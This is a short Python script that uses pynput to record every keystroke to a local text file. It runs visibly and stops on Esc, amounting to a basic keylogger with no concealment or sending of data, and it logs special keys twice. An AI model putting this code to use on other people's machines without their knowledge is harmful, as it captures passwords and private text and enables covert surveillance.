from pynput.keyboard import Key, Listener
import logging

# Log configuration for better efficiency
log_file = "our_log.txt"

# Set up logging to save only the message (the key)
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(message)s'
)

def on_press(key):
    try:
        # Try to get the alphanumeric character
        k = key.char if hasattr(key, 'char') and key.char is not None else str(key)
        
        # Mapping keys to be more readable in the file
        if key == Key.space:
            logging.info(' ')
        elif key == Key.enter:
            logging.info("[ENTER]\n")
        elif key == Key.tab:
            logging.info("[TAB]\t")
        elif hasattr(key, 'char'):
            logging.info(k)
        else:
            # Other special keys (Shift, Ctrl, etc)
            logging.info(f" [{k}] ")
            logging.info(f" [{str(key)}] ")
            
    except Exception as e:
        print(f"Error processing key: {e}")



def on_release(key):
    # Stop the script when Esc is pressed
    if key == Key.esc:
        print("Stopping monitoring...")
        return False

print("Monitoring keyboard... (Press ESC to exit)")

# Starting the Listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()